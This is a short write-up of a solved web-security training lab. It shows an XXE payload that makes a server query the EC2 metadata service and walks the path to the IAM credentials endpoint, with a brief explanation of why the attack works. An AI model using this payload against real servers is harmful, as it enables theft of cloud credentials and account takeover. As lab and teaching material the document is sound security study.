
## Lab 02: Exploiting XXE to Perform SSRF Attacks
 
**Technique:** XXE chained with SSRF against EC2 metadata service
**Target:** AWS IAM credentials via `169.254.169.254`
**Status:** Solved
 
### Context
 
The same XXE vector used to read local files can also be pointed at internal network resources. Instead of using the `file://` scheme to read from the filesystem, you use `http://` to make the server send a request to an internal URL. Because the request comes from the server itself, it can reach services that are firewalled from the outside. The EC2 instance metadata service at `169.254.169.254` is a classic target because it is only accessible from within the instance and it stores IAM credentials.
 
### What I Did
 
Intercepted the stock check request and modified the DOCTYPE to point the external entity at the metadata service:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
 
The response returned the top-level directory listing of the metadata endpoint. I worked through the directory structure iteratively, updating the URL in the entity each time to go deeper:
 
```
http://169.254.169.254/latest/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
 
At the final step the response returned the full IAM security credentials including the SecretAccessKey.
 
### Why It Works
 
The XML parser made an outbound HTTP request to the URL I specified and returned the response body as the entity value. The server was inside the AWS network so it had unrestricted access to the metadata endpoint. From the outside those credentials are completely inaccessible. From within the instance via XXE they were one request away.
